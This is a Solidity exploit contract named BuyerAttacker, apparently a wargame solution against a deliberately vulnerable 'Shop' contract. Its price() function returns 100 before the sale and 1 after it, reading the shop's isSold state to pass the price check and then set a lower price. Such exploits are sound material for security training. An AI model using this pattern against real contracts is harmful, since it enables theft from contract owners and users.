// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function buy() external;
    function isSold() external view returns (bool);
    function price() external view returns (uint256);
}

contract BuyerAttacker {
    IShop public shop;
    
    constructor(address _shop) {
        shop = IShop(_shop);
    }
    
    function price() external view returns (uint256) {
        // First call: return >= 100 to pass the check
        // Second call: return < 100 to set a lower price
        if (!shop.isSold()) {
            return 100; // First call - pass the price check
        } else {
            return 1; // Second call - set price to 1
        }
    }
    
    function attack() external {
        shop.buy();
    }
}